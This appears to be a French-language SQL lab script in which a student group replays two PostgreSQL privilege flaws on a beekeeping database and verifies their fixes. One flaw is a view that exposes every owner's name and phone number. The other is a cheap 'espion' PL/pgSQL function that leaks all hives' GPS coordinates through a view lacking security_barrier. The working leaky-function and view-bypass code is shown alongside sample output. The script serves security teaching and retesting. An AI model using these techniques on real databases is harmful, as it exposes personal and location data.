-- demo_failles.sql : preuves rejouables des failles P2 et P3 (TP Jour 2, Lab 10, étape 10.2)
-- Groupe : Praveen, Ugo, Hugo, Corentin
-- Lancement, en postgres, SANS ON_ERROR_STOP (des refus sont voulus) :
--   psql -U postgres -d queenbee -f demo_failles.sql
--
-- Se lance sur la base reconstruite, AVANT ou APRÈS corrections.sql, et ne
-- laisse rien : chaque partie est une transaction terminée par ROLLBACK.
--   Partie 1 recrée l'état d'avant les corrections (la vue du « collègue
--   pressé », v_mes_ruches sans barrière, le droit TEMPORARY rendu à PUBLIC),
--   puis joue les deux attaques en a.diop. Même résultat avant et après
--   corrections.sql : c'est la preuve.
--   Partie 2 pose la seule barrière (security_barrier) en laissant TEMPORARY :
--   c'est le retest « dans la même session » du rapport. Même résultat dans
--   les deux cas.
--   Partie 3 rejoue les attaques sur la base telle qu'elle est (retest « dans
--   une nouvelle session »). Ce qu'on doit observer :
--     avant corrections.sql, v_carte_ruches n'existe pas encore, et l'espion
--     reçoit les 11 ruches (11 NOTICE) ;
--     après corrections.sql, la vue donne 1 ligne sans nom ni téléphone, et
--     l'espion ne peut plus être créé (permission denied to create temporary tables).
--
-- ON_ERROR_ROLLBACK : psql pose un point de sauvegarde avant chaque commande ;
-- un refus voulu n'annule donc pas le reste de la transaction.
\set ON_ERROR_ROLLBACK on

-- ===========================================================================
-- Partie 1 · Les failles (état d'avant corrections.sql, recréé puis annulé)
-- ===========================================================================
BEGIN;
-- La vue du collègue pressé : code, position, nom et téléphone de TOUTES les ruches
DROP VIEW IF EXISTS v_carte_ruches;
CREATE VIEW v_carte_ruches AS
SELECT r.code, r.latitude, r.longitude, a.nom, a.telephone
FROM ruche r
JOIN apicultrice a ON a.id = r.apicultrice_id;
GRANT SELECT ON v_carte_ruches TO qb_apicultrice;
-- v_mes_ruches sans barrière, et le droit TEMPORARY rendu à PUBLIC (état du lab 8)
ALTER VIEW v_mes_ruches RESET (security_barrier);
DO $$
BEGIN
  EXECUTE format('GRANT TEMPORARY ON DATABASE %I TO PUBLIC', current_database());
END $$;

SET ROLE "a.diop";

-- P2 · la table est refusée...
SELECT nom, telephone FROM apicultrice;
-- Obtenu : ERROR:  permission denied for table apicultrice  -> attendu
-- ... mais la vue lit avec les droits de son propriétaire
SELECT code, nom, telephone FROM v_carte_ruches ORDER BY code;
-- Obtenu (avant comme après corrections.sql) :
--     code     |      nom       |     telephone
--  CI-YAMO-001 | Adjoua Kouassi | +225 07 300 00 05
--  CI-YAMO-002 | Adjoua Kouassi | +225 07 300 00 05
--  CI-YAMO-010 | Aya Kone       | +225 07 300 00 06
--  CM-BAFO-001 | Brigitte Ngono | +237 6 400 00 07
--  CM-BAFO-005 | Esther Fotso   | +237 6 400 00 08
--  SN-CASA-014 | Aminata Diop   | +221 77 100 00 01
--  SN-CASA-021 | Awa Diop       | +221 77 100 00 02
--  SN-CASA-099 | Aminata Diop   | +221 77 100 00 01
--  SN-KOLD-011 | Aminata Diop   | +221 77 200 00 03
--  SN-KOLD-012 | Aminata Diop   | +221 77 200 00 03
--  SN-KOLD-020 | Mariama Ba     | +221 77 200 00 04
-- (11 lignes)  -> faille P2 : tous les noms et téléphones, sans aucun droit sur apicultrice

-- P3 · la fonction espion, très « bon marché » : le planificateur l'évalue
-- avant le filtre de la vue
CREATE FUNCTION pg_temp.espion(c text, la numeric, lo numeric) RETURNS boolean
LANGUAGE plpgsql COST 0.0000001 AS $$
BEGIN
  RAISE NOTICE '% % %', c, la, lo;
  RETURN true;
END;
$$;
SELECT code FROM v_mes_ruches WHERE pg_temp.espion(code, latitude, longitude);
-- Obtenu (avant comme après corrections.sql) : 11 NOTICE, une par ruche
--   NOTICE:  SN-CASA-014 12.58330 -16.28330
--   NOTICE:  SN-CASA-099 12.58910 -16.27650
--   NOTICE:  SN-CASA-021 12.57480 -16.29120
--   NOTICE:  SN-KOLD-011 12.89390 -14.94120
--   NOTICE:  SN-KOLD-012 12.89810 -14.93560
--   NOTICE:  SN-KOLD-020 12.88740 -14.95030
--   NOTICE:  CI-YAMO-001 6.82060 -5.27670
--   NOTICE:  CI-YAMO-002 6.82540 -5.27180
--   NOTICE:  CI-YAMO-010 6.81470 -5.28330
--   NOTICE:  CM-BAFO-001 5.47750 10.41760
--   NOTICE:  CM-BAFO-005 5.48320 10.42410
-- puis le résultat : SN-CASA-021 (1 ligne)  -> faille P3 : le résultat ne montre
-- que sa ruche, mais l'espion a reçu la position GPS des 11

RESET ROLE;
ROLLBACK;

-- ===========================================================================
-- Partie 2 · La barrière seule (TEMPORARY encore ouvert, annulé ensuite)
-- ===========================================================================
BEGIN;
ALTER VIEW v_mes_ruches SET (security_barrier = true);
DO $$
BEGIN
  EXECUTE format('GRANT TEMPORARY ON DATABASE %I TO PUBLIC', current_database());
END $$;
SET ROLE "a.diop";
CREATE FUNCTION pg_temp.espion(c text, la numeric, lo numeric) RETURNS boolean
LANGUAGE plpgsql COST 0.0000001 AS $$
BEGIN
  RAISE NOTICE '% % %', c, la, lo;
  RETURN true;
END;
$$;
SELECT code FROM v_mes_ruches WHERE pg_temp.espion(code, latitude, longitude);
-- Obtenu (avant comme après corrections.sql) : un seul NOTICE,
--   NOTICE:  SN-CASA-021 12.57480 -16.29120
-- puis SN-CASA-021 (1 ligne)  -> le filtre de la vue passe d'abord
RESET ROLE;
ROLLBACK;

-- ===========================================================================
-- Partie 3 · La base telle qu'elle est (annulé aussi)
-- ===========================================================================
BEGIN;
SET ROLE "a.diop";
SELECT * FROM v_carte_ruches;
-- Obtenu avant corrections.sql : ERROR:  relation "v_carte_ruches" does not exist
-- Obtenu après corrections.sql :
--     code     | latitude | longitude
--  SN-CASA-021 | 12.57480 | -16.29120
-- (1 ligne)  -> sa ruche seulement, sans nom ni téléphone
CREATE FUNCTION pg_temp.espion(c text, la numeric, lo numeric) RETURNS boolean
LANGUAGE plpgsql COST 0.0000001 AS $$
BEGIN
  RAISE NOTICE '% % %', c, la, lo;
  RETURN true;
END;
$$;
-- Obtenu avant corrections.sql : CREATE FUNCTION
-- Obtenu après corrections.sql :
--   ERROR:  permission denied to create temporary tables in database "queenbee"
SELECT code FROM v_mes_ruches WHERE pg_temp.espion(code, latitude, longitude);
-- Obtenu avant corrections.sql : les 11 NOTICE de la partie 1, puis SN-CASA-021 (1 ligne)
-- Obtenu après corrections.sql : ERROR:  schema "pg_temp" does not exist
--   (la fonction n'a pas pu être créée : plus d'espion possible)
RESET ROLE;
ROLLBACK;
